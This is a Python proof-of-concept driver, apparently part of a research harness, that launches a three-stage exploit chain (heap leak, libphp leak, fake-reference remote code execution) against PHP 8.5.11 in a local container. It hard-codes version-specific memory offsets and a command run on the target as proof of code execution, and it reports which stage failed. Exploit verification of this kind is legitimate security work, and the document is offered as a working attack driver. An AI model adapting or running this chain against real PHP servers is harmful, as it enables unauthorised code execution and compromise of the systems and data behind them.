#!/usr/bin/env python3
"""php2shell PoC — PHP 8.5.11 (p2s8511, port 18114).

Chain: stage-1 heap leak -> stage-2 libphp leak -> stage-3 fake-ref RCE.
Offsets: zif=0x5996e0 dtor=0x7b47a0 htdata=0x690d8
Known status: unknown

Usage:
    python poc/poc_8511.py
"""
import subprocess, sys, os, time

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXPLOIT = os.path.join(BASE, "exploit.py")

VER = "8.5.11"
PORT = 18114
CONTAINER = "p2s8511"
ZIF = 0x5996e0
DTOR = 0x7b47a0
HTDATA = 0x690d8
STAGE1_N = 841
STAGE2_T = 406
STAGE2_V = 16
CARRIER = True
CMD = "id>/www/p1"
FETCH = "/p1"


def run(retries: int = 3, timeout: int = 600) -> tuple[bool, str]:
    url = f"http://127.0.0.1:{PORT}/"
    args = [
        sys.executable, EXPLOIT,
        "-u", url,
        "-c", CMD,
        "--zif-offset", hex(ZIF),
        "--dtor-offset", hex(DTOR),
        "--htdata-offset", hex(HTDATA),
        "--profile", "bookworm",
        "--huge-mb", "256",
        "--retries", str(retries),
        "--fetch", FETCH,
        "--no-auto-offsets",
        "-q",
    ]
    t0 = time.time()
    r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    dt = time.time() - t0
    out = (r.stdout or "") + (r.stderr or "")
    ok = ("PROOF:" in out) and (r.returncode == 0)
    return ok, out, dt


def main() -> int:
    print(f"[*] php2shell PoC  VER={VER}  container={CONTAINER}  port={PORT}", flush=True)
    print(f"[*] offsets: zif=0x{ZIF:x} dtor=0x{DTOR:x} htdata=0x{HTDATA:x}", flush=True)
    ok, out, dt = run()
    # Print the last 20 lines of exploit output (skip noise)
    lines = out.strip().splitlines()
    for ln in lines[-20:]:
        print(f"    {ln}", flush=True)
    if ok:
        print(f"[+] RCE PROVEN  {VER}  ({dt:.1f}s)", flush=True)
        return 0
    else:
        # Determine which stage failed
        if "HEAP_LEAK_FAILED" in out:
            stage = "stage-1 (heap leak)"
        elif "LIBPHP_LEAK_FAILED" in out:
            stage = "stage-2 (libphp leak)"
        elif "EXPLOIT_FAILED" in out:
            stage = "stage-3 (RCE)"
        else:
            stage = "unknown"
        print(f"[-] FAILED  {VER}  ({dt:.1f}s)  blocker: {stage}", flush=True)
        return 1


if __name__ == "__main__":
    sys.exit(main())
